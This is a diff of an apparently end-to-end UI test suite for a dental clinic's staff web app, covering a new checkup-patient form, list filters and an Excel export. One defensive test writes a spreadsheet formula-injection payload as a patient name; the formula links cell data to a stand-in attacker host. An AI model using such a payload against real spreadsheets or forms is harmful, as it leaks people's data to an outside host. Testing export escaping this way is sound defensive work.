@@ -153,6 +153,24 @@ await step('flag patient for Dr. Ali from the sheet', async () => {
 // ------------------------------------------------------------- checkup patients on the Aaj ki List (front desk, North Nazimabad)
 // (Checkup patients have no Mr#. Made-up names only; the demo keeps its data in memory, so the browser is never reloaded here.)
 const checkupRow = (pg, name) => pg.locator(`table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient ${name}"])`);
+// The checkup form ("Checkup Patient Form 2.0", owner 11 Oct 2026) has nine questions, all required for a new checkup. This fills them; the
+// doctor is the first one the website lists (no name is written into the test) unless doctorOther gives the "Other" text.
+async function fillCheckupForm(m, { name, phone, checkupFor = 'General checkup', forOther = null, doctorOther = null, ali = 'Yes', pricing = 'Yes', wants = 'Yes', plan = 'Next month' }) {
+  await m.getByLabel(/^Patient full name/).fill(name);
+  if (phone !== undefined) await m.getByLabel(/^Mobile number/).fill(phone);
+  if (doctorOther) {
+    await m.getByLabel(/^Who did your checkup/).selectOption('__other');
+    await m.getByLabel(/^Other: who did the checkup/).fill(doctorOther);
+  } else await m.getByLabel(/^Who did your checkup/).selectOption({ index: 1 });
+  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel(ali, { exact: true }).check();
+  if (forOther) {
+    await m.getByLabel(/^What was your checkup for/).selectOption('__other');
+    await m.getByLabel(/^Other: what was the checkup for/).fill(forOther);
+  } else await m.getByLabel(/^What was your checkup for/).selectOption(checkupFor);
+  await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByLabel(pricing, { exact: true }).check();
+  await m.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel(wants, { exact: true }).check();
+  await m.getByLabel(/^If yes, then when/).fill(plan);
+}
 await step('front desk: the Aaj ki List shows the checkup patients of the day with a "Checkup" badge and no Mr#, sorted like the sheet with a serial number on every row', async () => {
   await page.goto(BASE + '#/staff/sheet');
   await page.waitForSelector('table.sheet tbody tr.is-checkup');
@@ -176,17 +194,17 @@ await step('front desk: the Aaj ki List shows the checkup patients of the day wi
   assert.match(await page.locator('.page-head p').innerText(), /\d+ checkups/);
   await shot(page, '14-sheet-checkups');
 });
-await step('front desk: "+ Checkup patient" adds a checkup patient (no Mr#); details and status save; the row can be removed', async () => {
-  await page.getByRole('button', { name: '+ Checkup patient' }).click();
+await step('front desk: "+ Add checkup patient" on the Aaj ki List adds a checkup patient (no Mr#) with the checkup form; details and status save; the row can be removed', async () => {
+  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = page.locator('.modal');
-  await m.getByLabel(/^Name/).fill('Checkup Test Person');
-  await m.getByLabel(/^Phone number/).fill('0300 5550101');
-  await m.getByLabel('Treatment', { exact: true }).fill('Scaling');
+  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), 'North Nazimabad', 'the branch of the list on screen');
+  assert.equal(await m.getByLabel(/^Which branch did you visit/).getAttribute('readonly'), '', 'and it is not asked');
+  await fillCheckupForm(m, { name: 'Checkup Test Person', phone: '0300 5550101', checkupFor: 'Scaling and polishing' });
   await m.getByRole('button', { name: 'Add checkup patient' }).click();
   await page.waitForSelector('.toast:has-text("Checkup Test Person added as a checkup patient")');
   const row = checkupRow(page, 'Checkup Test Person');
   await row.waitFor();
-  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Scaling');
+  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Scaling and polishing', '"What was your checkup for?" is the treatment of the row');
   assert.equal(await row.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550101');
   assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'today: waiting');
   assert.doesNotMatch(await row.locator('th').innerText(), /Mr# \d/);
@@ -208,11 +226,11 @@ await step('front desk: "+ Checkup patient" adds a checkup patient (no Mr#); det
   await row.waitFor({ state: 'detached' });
 });
 await step('front desk: a checkup patient whose phone belongs to a patient file is offered "Add Mr# N to the list instead"', async () => {
-  await page.getByRole('button', { name: '+ Checkup patient' }).click();
+  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = page.locator('.modal');
-  await m.getByLabel(/^Name/).fill('Dup Check Person');
-  await m.getByLabel(/^Phone number/).fill('03010734521');
-  await m.getByLabel(/^Phone number/).press('Tab');
+  await m.getByLabel(/^Patient full name/).fill('Dup Check Person');
+  await m.getByLabel(/^Mobile number/).fill('03010734521');
+  await m.getByLabel(/^Mobile number/).press('Tab');
   await m.locator('.alert-warning:has-text("already has a patient file")').waitFor();
   const text = await m.locator('.alert-warning').innerText();
   const mr = text.match(/Mr# (\d+)/)[1];
@@ -236,11 +254,9 @@ await step('front desk: the status filter and the find box apply to the checkup 
 });
 
 await step('front desk: "Register as patient" on a checkup row gives an Mr#, and "Put Mr# N on this list" turns the row into a patient row', async () => {
-  await page.getByRole('button', { name: '+ Checkup patient' }).click();
+  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = page.locator('.modal');
-  await m.getByLabel(/^Name/).fill('Register Flow Person');
-  await m.getByLabel(/^Phone number/).fill('0300 5550104');
-  await m.getByLabel('Treatment', { exact: true }).fill('Whitening');
+  await fillCheckupForm(m, { name: 'Register Flow Person', phone: '0300 5550104', forOther: 'Whitening' });
   await m.getByRole('button', { name: 'Add checkup patient' }).click();
   const row = checkupRow(page, 'Register Flow Person');
   await row.waitFor();
@@ -254,7 +270,7 @@ await step('front desk: "Register as patient" on a checkup row gives an Mr#, and
   await page.waitForSelector('.modal', { state: 'detached' });
   const visit = page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` });
   await visit.waitFor();
-  assert.equal(await visit.locator('input[aria-label^="Treatment for"]').inputValue(), 'Whitening', 'the visit carries what the checkup was for');
+  assert.equal(await visit.locator('input[aria-label^="Treatment for"]').inputValue(), 'Whitening', 'the visit carries what the checkup was for (the "Other" text of the form)');
   assert.equal(await row.count(), 0, 'the checkup row is now a patient row');
   await page.goto(BASE + '#/staff/checkups?q=5550104');
   const link = page.locator('table.checkup-table tbody tr[data-id] a.mr');
@@ -274,23 +290,24 @@ await step('front desk: the arrow keys move between the name cells of checkup ro
 
 await step('front desk: the same phone number twice on one day\'s list is flagged before the second checkup is added', async () => {
   const add = async (name, phone) => {
-    await page.getByRole('button', { name: '+ Checkup patient' }).click();
+    await page.getByRole('button', { name: '+ Add checkup patient' }).click();
     const m = page.locator('.modal');
-    await m.getByLabel(/^Name/).fill(name);
-    await m.getByLabel(/^Phone number/).fill(phone);
-    await m.getByLabel(/^Phone number/).press('Tab');
+    await m.getByLabel(/^Patient full name/).fill(name);
+    await m.getByLabel(/^Mobile number/).fill(phone);
+    await m.getByLabel(/^Mobile number/).press('Tab');
     return m;
   };
   const first = await add('Twice Typed Person', '0300 5550955');
   assert.equal(await first.locator('.alert-warning:has-text("Already on the list for")').count(), 0, 'nothing to warn about the first time');
+  await fillCheckupForm(first, { name: 'Twice Typed Person' });
   await first.getByRole('button', { name: 'Add checkup patient' }).click();
   await checkupRow(page, 'Twice Typed Person').waitFor();
   const second = await add('Twice Typed Person', '0300-555 0955');
   await second.locator('.alert-warning:has-text("Already on the list for")').waitFor();
   assert.match(await second.locator('.alert-warning').innerText(), /Twice Typed Person \(0300 5550955\)\. Press Cancel unless this is a different person\./);
   // a different number is not flagged, and adding anyway stays possible
-  await second.getByLabel(/^Phone number/).fill('0300 5550957');
-  await second.getByLabel(/^Phone number/).press('Tab');
+  await second.getByLabel(/^Mobile number/).fill('0300 5550957');
+  await second.getByLabel(/^Mobile number/).press('Tab');
   await page.waitForFunction(() => !document.querySelector('.modal .alert-warning'));
   await second.getByRole('button', { name: 'Cancel' }).click();
   await page.waitForSelector('.modal', { state: 'detached' });
@@ -339,6 +356,88 @@ await step('front desk: the top search tells where a checkup patient is (no Mr#)
   await page.getByLabel('Search patients').fill('');
   await page.goto(BASE + '#/staff/sheet');
   await page.waitForSelector('table.sheet tbody tr.is-checkup');
+});
+
+// ------------------------------------------------------------- "+ Add checkup patient" on the Today page (owner, 11 Oct 2026)
+await step('Today page (the first page after login): "+ Add checkup patient" opens the checkup form with its nine questions in the form\'s order', async () => {
+  await page.locator('.topnav a:has-text("Today")').click();
+  const panel = page.locator('section.today-checkup');
+  await panel.waitFor();
+  assert.match(await panel.innerText(), /Checkup patient\?/);
+  assert.match(await panel.innerText(), /\d+ checkup patients? on today's lists so far\./);
+  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
+  const m = page.locator('.modal');
+  await m.waitFor();
+  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient');
+  const questions = await m.locator('.checkup-form').evaluate((el) => [...el.querySelectorAll('.field-label, legend')].filter((x) => !x.closest('[hidden]')).map((x) => x.firstChild.textContent.trim()));
+  assert.deepEqual(questions, ['Patient full name', 'Which branch did you visit?', 'Mobile number', 'Who did your checkup?', 'Did Dr. Ali recommend your treatment?',
+    'What was your checkup for?', 'Did you understand the pricing details?', 'Would you like to start the treatment?', 'If yes, then when? If no, then why not?']);
+  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), 'North Nazimabad', 'a front desk limited to one branch: that branch, not asked');
+  const doctors = await m.getByLabel(/^Who did your checkup/).locator('option').allTextContents();
+  const expected = await page.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.clinicians.filter((c) => c.is_doctor && c.active !== false).map((c) => c.display_name); });
+  assert.deepEqual(doctors, ['Choose…', ...expected, 'Other'], "the website's doctors, then Other");
+  assert.deepEqual(await m.getByLabel(/^What was your checkup for/).locator('option').allTextContents(),
+    ['Choose…', 'Braces', 'General checkup', 'Smile makeover', 'Scaling and polishing', 'Root canal', 'Extraction', 'Crown / bridge', 'Implant', 'Other']);
+  assert.deepEqual(await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByRole('radio').evaluateAll((els) => els.map((e) => e.labels[0].textContent.trim())),
+    ['Yes', 'No', 'Needs clearer explanation']);
+  assert.equal(await m.getByLabel(/^If yes, then when/).getAttribute('maxlength'), '500');
+  assert.equal(await m.locator('details.form-more').evaluate((el) => el.open), false, 'date, follow-up, details and notes wait under "More (optional)"');
+  await shot(page, '19-checkup-form');
+});
+await step('Today page: the checkup form says what is missing; "Other" opens a text box that must be filled', async () => {
+  const m = page.locator('.modal');
+  await m.getByRole('button', { name: 'Add checkup patient' }).click();
+  await m.locator('.field-error').first().waitFor();
+  assert.deepEqual(await m.locator('.field-error').allInnerTexts(), ['Write the patient name.', 'Write a full phone number with at least 10 digits, e.g. 0300 1234567.',
+    'Choose who did the checkup.', 'Choose whether Dr. Ali recommended the treatment.', 'Choose what the checkup was for.', 'Choose whether the pricing was understood.',
+    'Choose whether they want to start the treatment.', 'Write when they want to start, or why not.']);
+  assert.equal(await page.evaluate(() => document.activeElement?.closest('.field')?.querySelector('.field-label')?.firstChild.textContent), 'Patient full name', 'focus on the first one');
+  assert.equal(await m.getByLabel(/^Other: who did the checkup/).isVisible(), false, 'no text box until Other is chosen');
+  await m.getByLabel(/^Who did your checkup/).selectOption('__other');
+  await m.getByLabel(/^What was your checkup for/).selectOption('__other');
+  assert.ok(await m.getByLabel(/^Other: who did the checkup/).isVisible() && await m.getByLabel(/^Other: what was the checkup for/).isVisible());
+  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('No', { exact: true }).check();
+  await m.getByRole('button', { name: 'Add checkup patient' }).click();
+  await m.locator('.field-error:has-text("Write who did the checkup.")').waitFor();
+  assert.ok(await m.locator('.field-error:has-text("Write what the checkup was for.")').count());
+  assert.equal(await m.locator('.field-error:has-text("Dr. Ali recommended")').count(), 0, 'a choice clears the error of its question');
+  await page.keyboard.press('Escape');
+  await page.waitForSelector('.modal', { state: 'detached' });
+});
+await step('Today page: a checkup saved from the form is on the Checkups page with its answers, and on the branch\'s Aaj ki List for today', async () => {
+  const before = Number((await page.locator('section.today-checkup').innerText()).match(/(\d+) checkup patients? on today/)[1]);
+  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
+  const m = page.locator('.modal');
+  await fillCheckupForm(m, { name: 'Form Two Person', phone: '0300 5550961', doctorOther: 'Dr. Visiting (sample)', forOther: 'Gum treatment',
+    ali: 'Yes', pricing: 'Needs clearer explanation', wants: 'Yes', plan: 'After Eid, in installments' });
+  await m.getByRole('button', { name: 'Add checkup patient' }).click();
+  await page.waitForSelector('.toast:has-text("Form Two Person added as a checkup patient.")');
+  assert.match(await page.locator('section.today-checkup').innerText(), new RegExp(`${before + 1} checkup patients? on today's lists so far`), 'the count on the Today page goes up');
+  await page.goto(BASE + '#/staff/checkups?q=Form%20Two%20Person');
+  const row = page.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Form Two Person' });
+  await row.waitFor();
+  const cells = await row.locator('td').allInnerTexts();
+  const heads = (await page.locator('table.checkup-table thead th').allInnerTexts()).map((t) => t.trim());
+  const cell = (label) => { const i = heads.indexOf(label); return cells[i > 1 ? i - 1 : i]; };   // (the Patient column is the row's th, not a td)
+  assert.match(cell('Treatment').trim(), /^Gum treatment\nDr\. Visiting \(sample\)\nDr\. Ali recommended: Yes\nUnderstood pricing: Needs clearer explanation$/);
+  assert.equal(cell('Wants to start').trim(), 'Yes');
+  assert.equal(cell('When / why not').trim(), 'After Eid, in installments');
+  assert.match(cell('Branch'), /North Nazimabad/);
+  assert.match(cell('Date'), new RegExp(await page.evaluate(async () => { const { shortDate, localISO } = await import('/js/ui/dom.js'); return shortDate(localISO()); })));
+  assert.match(cell('Source'), /Website/);
+  await page.goto(BASE + '#/staff/sheet');
+  const onList = checkupRow(page, 'Form Two Person');
+  await onList.waitFor();
+  assert.equal(await onList.locator('input[aria-label^="Treatment for"]').inputValue(), 'Gum treatment');
+  assert.equal(await onList.locator('input[aria-label^="Doctor\'s name for"]').inputValue(), 'Dr. Visiting (sample)');
+  assert.equal(await onList.locator('select[aria-label^="Status for"]').inputValue(), 'waiting');
+  await onList.getByRole('button', { name: /Checkup options/ }).click();
+  const opts = await page.locator('.modal').innerText();
+  assert.match(opts, /Wants to start\s+Yes/);
+  assert.match(opts, /When \/ why not\s+After Eid, in installments/);
+  assert.match(opts, /Understood pricing\s+Needs clearer explanation/);
+  await page.keyboard.press('Escape');
+  await page.waitForSelector('.modal', { state: 'detached' });
 });
 
 // ------------------------------------------------------------- assistant + braces rules
@@ -1643,7 +1742,8 @@ await step('Checkups page: menu entry, 50 rows a page, Next and Previous keep fo
   await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes('Showing 51-'), total);
   assert.equal(await rowsOf(pk).count(), Math.min(50, total - 50));
   assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Next', 'focus stays on the pressed button');
-  assert.deepEqual((await pk.locator('table.checkup-table thead th').allInnerTexts()).slice(0, 7).map((t) => t.trim()), ['Date', 'Patient', 'Branch', 'Treatment', 'Follow-up', 'Notes', 'Source'], 'one word, Treatment, as on the Aaj ki List');
+  assert.deepEqual((await pk.locator('table.checkup-table thead th').allInnerTexts()).slice(0, 9).map((t) => t.trim()), ['Date', 'Patient', 'Branch', 'Treatment', 'Wants to start', 'When / why not', 'Follow-up', 'Notes', 'Source'], 'one word, Treatment, as on the Aaj ki List; then the answers of the checkup form');
+  assert.ok(await pk.evaluate(() => { const w = document.querySelector('.checkup-table-wrap'); return w.scrollWidth <= w.clientWidth + 1; }), 'at 1366 px the whole list fits, answers included');
   assert.match(await pk.evaluate(() => location.hash), /page=2/);
   await pk.getByRole('button', { name: 'Previous' }).click();
   await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
@@ -1723,7 +1823,7 @@ await step('Checkups page: search by name or phone, filters, and "Clear filters"
   await moreFilters(pk);
   await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
   await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
-  const sources = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(7)').allInnerTexts();
+  const sources = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(9)').allInnerTexts();
   assert.ok(sources.length > 0 && sources.every((t) => /^Old list/.test(t.trim())), 'only old-list rows');
   await pk.getByRole('button', { name: 'Clear filters' }).click();
   await moreFilters(pk);
@@ -1753,27 +1853,81 @@ await step('Checkups page: a follow-up status and a note save, and are still the
   const back = pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`);
   assert.equal(await back.locator('select[aria-label^="Follow-up status for"]').inputValue(), target);
   assert.equal(await back.locator('input[aria-label^="Notes for"]').inputValue(), 'Call back on Monday (test)');
-  // the Edit dialog changes the fee and the doctor
-  await back.getByRole('button', { name: /^Edit / }).click();
+  // the Edit dialog of an old-list row (no answers): the same questions as the checkup form, none of the four new ones required; it changes the fee and the doctor
+  await pk.getByRole('button', { name: 'Clear filters' }).click();
+  await moreFilters(pk);
+  await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
+  await pk.waitForFunction(() => /source=archive/.test(location.hash) && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false'
+    && [...document.querySelectorAll('table.checkup-table tbody tr[data-id] td:nth-child(9)')].every((t) => /^Old list/.test(t.textContent.trim())));
+  const oldRow = rowsOf(pk).filter({ hasNot: pk.locator('td.checkup-plan:not(:has(.muted))') }).first();
+  const oldId = await oldRow.getAttribute('data-id');
+  await oldRow.getByRole('button', { name: /^Edit / }).click();
   const m = pk.locator('.modal');
-  assert.ok(await m.getByLabel('Treatment', { exact: true }).count(), 'the Edit dialog says Treatment too');
+  assert.ok(await m.getByLabel(/^What was your checkup for/).count() && await m.getByLabel(/^Who did your checkup/).count(), 'the Edit dialog asks the questions of the form');
+  for (const q of [/^Did Dr\. Ali recommend your treatment/, /^Did you understand the pricing details/, /^Would you like to start the treatment/]) {
+    const group = m.getByRole('group', { name: q });
+    assert.doesNotMatch(await group.locator('legend').innerText(), /required/, 'an old row has no answers, so this question is not required: ' + q);
+    assert.equal(await group.getByRole('radio', { checked: true }).count(), 0, 'and nothing is chosen');
+  }
+  assert.doesNotMatch(await m.locator('.checkup-form-wide .field-label').innerText(), /required/, '"If yes, then when?" is not required either');
   await m.getByLabel(/Estimated fee/).fill('12000');
-  await m.getByLabel("Doctor's name").fill('Dr. Hina (sample)');
+  await m.getByLabel(/^Who did your checkup/).selectOption({ label: 'Dr. Hina (sample)' });
   await m.getByRole('button', { name: 'Save' }).click();
   await pk.waitForSelector('.toast:has-text("saved")');
   await pk.waitForSelector('.modal', { state: 'detached' });
-  assert.match(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).innerText(), /Dr\. Hina \(sample\)/);
+  const edited = pk.locator(`table.checkup-table tbody tr[data-id="${oldId}"]`);
+  assert.match(await edited.innerText(), /Dr\. Hina \(sample\)/);
+  // answers can be added to an old row later (after a follow-up call), one at a time
+  await edited.getByRole('button', { name: /^Edit / }).click();
+  await m.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel('No', { exact: true }).check();
+  await m.getByLabel(/^If yes, then when/).fill('Called back: price too high for now');
+  await m.getByRole('button', { name: 'Save' }).click();
+  await pk.waitForSelector('.modal', { state: 'detached' });
+  await edited.locator('td.checkup-plan:has-text("Called back: price too high for now")').waitFor();
+  // once the row has answers, the four questions are required on Edit
+  await edited.getByRole('button', { name: /^Edit / }).click();
+  assert.match(await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).locator('legend').innerText(), /required/);
+  await m.getByRole('button', { name: 'Save' }).click();
+  await m.locator('.field-error:has-text("Choose whether Dr. Ali recommended the treatment.")').waitFor();
+  assert.ok(await m.locator('.field-error:has-text("Choose whether the pricing was understood.")').count());
+  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('Yes', { exact: true }).check();
+  await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByLabel('No', { exact: true }).check();
+  await m.getByRole('button', { name: 'Save' }).click();
+  await pk.waitForSelector('.modal', { state: 'detached' });
+  await edited.locator('.answer-line:has-text("Understood pricing: No")').waitFor();
+  assert.match(await edited.innerText(), /Dr\. Ali recommended: Yes/);
   await pk.getByRole('button', { name: 'Clear filters' }).click();
 });
-await step('Checkups page: "+ Add checkup" adds an earlier day to the list', async () => {
-  await pk.getByRole('button', { name: '+ Add checkup' }).click();
+await step('Checkups page: the "Wants to start" filter shows only Yes or only No (rows without the answer match neither), and is kept in the address', async () => {
+  const total = await pagerTotal(pk);
+  await pk.locator('.checkup-filters').getByLabel('Wants to start').selectOption('yes');
+  await pk.waitForFunction((n) => !document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
+  let col = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(5)').allInnerTexts();
+  assert.ok(col.length > 0 && col.every((t) => t.trim() === 'Yes'), 'only Yes: ' + col.join(','));
+  assert.match(await pk.evaluate(() => location.hash), /wants=yes/);
+  await pk.locator('.checkup-filters').getByLabel('Wants to start').selectOption('no');
+  await pk.waitForFunction(() => /wants=no/.test(location.hash) && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
+  col = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(5)').allInnerTexts();
+  assert.ok(col.length > 0 && col.every((t) => t.trim() === 'No'), 'only No: ' + col.join(','));
+  assert.ok((await pagerTotal(pk)) < total);
+  await shot(pk, '20-checkups-wants-no');
+  await pk.getByRole('button', { name: 'Clear filters' }).click();
+  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
+  assert.equal(await pk.locator('.checkup-filters').getByLabel('Wants to start').inputValue(), '');
+});
+await step('Checkups page: "+ Add checkup patient" adds an earlier day to the list (the date under "More"), and the branch can be changed by someone who works at every branch', async () => {
+  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = pk.locator('.modal');
-  await m.getByLabel(/^Name/).fill('Page Added Person');
-  await m.getByLabel(/^Phone number/).fill('0300 5550102');
+  const branchChoices = await m.getByLabel(/^Which branch did you visit/).locator('option').allTextContents();
+  assert.deepEqual(branchChoices, await pk.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.branches.map((b) => b.name); }), "a drop-down of the website's branches");
+  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'North Nazimabad' });
+  await fillCheckupForm(m, { name: 'Page Added Person', phone: '0300 5550102', checkupFor: 'Implant', wants: 'No', plan: 'Wants to save up first' });
+  await m.locator('summary', { hasText: 'More (optional)' }).click();
   await m.getByLabel(/^Date/).fill('2026-09-01');
   await m.getByLabel('Follow-up status').selectOption('Interested');
   await m.getByRole('button', { name: 'Add checkup patient' }).click();
   await pk.waitForSelector('.modal', { state: 'detached' });
+  await pk.waitForSelector('.toast:has-text("Page Added Person added as a checkup patient.")');
   await pk.getByLabel('Name or phone').fill('Page Added Person');
   const row = rowsOf(pk).filter({ hasText: 'Page Added Person' });
   await row.waitFor();
@@ -1781,19 +1935,23 @@ await step('Checkups page: "+ Add checkup" adds an earlier day to the list', asy
   await pk.waitForFunction(() => document.querySelector('.page-head p')?.textContent.trim() === '1 checkup patient matches these filters');   // one match reads in the singular
   assert.equal(await row.locator('select[aria-label^="Follow-up status for"]').inputValue(), 'Interested');
   assert.match(await row.innerText(), /Website/);
+  assert.match(await row.innerText(), /Wants to save up first/);
+  assert.match(await row.innerText(), /North Nazimabad/);
   await pk.getByRole('button', { name: 'Clear filters' }).click();
 });
-await step("Checkups page: \"+ Add checkup\" flags a phone number already on that branch's list for the day, and the flag follows the date", async () => {
-  await pk.getByRole('button', { name: '+ Add checkup' }).click();
+await step("Checkups page: \"+ Add checkup patient\" flags a phone number already on that branch's list for the day, and the flag follows the date", async () => {
+  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = pk.locator('.modal');
-  await m.getByLabel(/^Name/).fill('Page Added Person');
-  await m.getByLabel(/^Phone number/).fill('0300 5550102');
+  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'North Nazimabad' });
+  await m.getByLabel(/^Patient full name/).fill('Page Added Person');
+  await m.getByLabel(/^Mobile number/).fill('0300 5550102');
+  await m.locator('summary', { hasText: 'More (optional)' }).click();
   await m.getByLabel(/^Date/).fill('2026-09-01');
-  await m.getByLabel(/^Phone number/).press('Tab');
+  await m.getByLabel(/^Mobile number/).press('Tab');
   await m.locator('.alert-warning:has-text("Already on the list for 1 Sep")').waitFor();
   await m.getByLabel(/^Date/).fill('2026-08-31');
   await pk.waitForFunction(() => !document.querySelector('.modal')?.textContent.includes('Already on the list for'));
-  assert.match(await m.innerText(), /Goes on the Checkups page, and on that branch's Aaj ki List for the day you choose\./);
+  assert.match(await m.innerText(), /Goes on the Checkups page, and on that branch's Aaj ki List for today \(another day can be chosen under More\)\./);
   await m.getByRole('button', { name: 'Cancel' }).click();
   await pk.waitForSelector('.modal', { state: 'detached' });
 });
@@ -1839,7 +1997,10 @@ await step('Checkups page: front desk has no "Download Excel"; the admin downloa
   await pk.waitForFunction(() => window.__xlsx);
   const x = await pk.evaluate(() => window.__xlsx);
   assert.match(x.name, /^checkups_ALL_\d{4}-\d{2}-\d{2}\.xlsx$/);
-  assert.deepEqual(x.aoa[0], ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Date', 'Day status', 'Treatment details', 'Source', 'Mr#', 'Added on']);
+  assert.deepEqual(x.aoa[0], ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Date', 'Day status', 'Treatment details', 'Source', 'Mr#', 'Added on',
+    'Dr. Ali recommended', 'Understood pricing', 'Wants to start', 'When / why not']);
+  const added = x.aoa.find((r) => r[1] === 'Page Added Person');
+  assert.deepEqual(added.slice(17), ['Yes', 'Yes', 'No', 'Wants to save up first'], 'the answers of the checkup form are in the file');
   assert.equal(x.aoa.length - 1, total, 'one line per checkup');
   assert.ok(x.aoa.slice(1).every((r) => typeof r[2] === 'string'), 'phones are text');
   // a narrower download follows the filters and names the branch
@@ -1859,7 +2020,7 @@ await step('Checkups page: front desk has no "Download Excel"; the admin downloa
   await page.waitForSelector('h1:has-text("Checkups")');
   await page.waitForSelector('table.checkup-table tbody tr[data-id]');
   assert.equal(await page.getByRole('button', { name: 'Download Excel' }).count(), 0);
-  assert.ok(await page.getByRole('button', { name: '+ Add checkup' }).count(), 'but they may add a checkup');
+  assert.ok(await page.getByRole('button', { name: '+ Add checkup patient' }).count(), 'but they may add a checkup patient');
 });
 await step('Admin -> Import -> "5. Checkup list": a file in the owner\'s layout is previewed and imported; the same file again adds nothing', async () => {
   await pk.goto(BASE + '#/staff/admin?tab=import');
@@ -1923,11 +2084,10 @@ await step('Admin: the Aaj ki List "All branches" shows the checkup rows with th
 await step('Aaj ki List download: a checkup patient named like a formula is written as text, not as a formula', async () => {
   const evil = '=HYPERLINK("https://evil.example/?d="&K2,"Open")';
   await pk.goto(BASE + '#/staff/sheet?branch=2');
-  await pk.getByRole('button', { name: '+ Checkup patient' }).waitFor();
-  await pk.getByRole('button', { name: '+ Checkup patient' }).click();
+  await pk.getByRole('button', { name: '+ Add checkup patient' }).waitFor();
+  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
   const m = pk.locator('.modal');
-  await m.getByLabel(/^Name/).fill(evil);
-  await m.getByLabel(/^Phone number/).fill('0300 5550956');
+  await fillCheckupForm(m, { name: evil, phone: '0300 5550956' });
   await m.getByRole('button', { name: 'Add checkup patient' }).click();
   await pk.waitForSelector('.toast:has-text("added as a checkup patient")');
   const row = pk.locator('table.sheet tbody tr.is-checkup', { has: pk.locator('input[aria-label^="Name of checkup patient =HYPERLINK"]') });
@@ -1986,9 +2146,8 @@ await step('Front desk (North Nazimabad) on the Checkups page sees the imported 
   assert.equal(await m.getByRole('button', { name: 'Remove' }).count(), 0, 'old-list rows are removed by Dr. Ali only');
   await pk.keyboard.press('Escape');
   // a row the front desk added on the website can be removed from the Edit dialog
-  await pk.getByRole('button', { name: '+ Add checkup' }).click();
-  await pk.locator('.modal').getByLabel(/^Name/).fill('Remove Me Person');
-  await pk.locator('.modal').getByLabel(/^Phone number/).fill('0300 5550103');
+  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
+  await fillCheckupForm(pk.locator('.modal'), { name: 'Remove Me Person', phone: '0300 5550103' });
   await pk.locator('.modal').getByRole('button', { name: 'Add checkup patient' }).click();
   await pk.waitForSelector('.modal', { state: 'detached' });
   await pk.getByLabel('Name or phone').fill('Remove Me Person');
@@ -2063,17 +2222,20 @@ export function getData() {
 }
 `,
 }));
-await step('before the database update: the Aaj ki List works without checkup rows or "+ Checkup patient", and the Checkups page says it is not switched on yet', async () => {
+await step('before the database update: the Aaj ki List works without checkup rows or "+ Add checkup patient", the Today page has no checkup button, and the Checkups page says it is not switched on yet', async () => {
   await loginAs(pm, 'Front desk \\(North Nazimabad\\)');
   await pm.goto(BASE + '#/staff/sheet');
   await pm.waitForSelector('table.sheet tbody tr');
   assert.equal(await pm.locator('table.sheet tbody tr.is-checkup').count(), 0);
-  assert.equal(await pm.getByRole('button', { name: '+ Checkup patient' }).count(), 0);
+  assert.equal(await pm.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
   assert.ok(await pm.getByRole('button', { name: '+ New walk-in' }).count(), 'the walk-in button stays');
   assert.doesNotMatch(await pm.locator('.page-head p').innerText(), /checkups/);
   await pm.goto(BASE + '#/staff/checkups');
   await pm.waitForSelector('.empty:has-text("not switched on yet")');
